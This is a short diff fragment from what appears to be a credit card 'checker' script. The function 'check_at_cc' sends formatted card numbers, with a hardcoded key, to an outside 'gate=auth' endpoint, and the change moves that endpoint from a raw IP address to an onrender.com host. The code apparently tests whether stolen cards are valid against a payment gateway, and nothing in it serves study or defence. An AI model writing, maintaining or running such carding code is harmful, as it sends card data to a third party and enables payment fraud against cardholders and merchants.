@@ -8864,7 +8864,7 @@ def check_at_cc(cc):
         # API request
         try:
             response = requests.get(
-                f"http://147.93.105.138:1112/gate=auth/key=darkwaslost/cc={formatted_cc}",
+                f"https://authnet-api.onrender.com/gate=auth/key=darkwaslost/cc={formatted_cc}",
                 timeout=120
             )
             if response.status_code == 200:
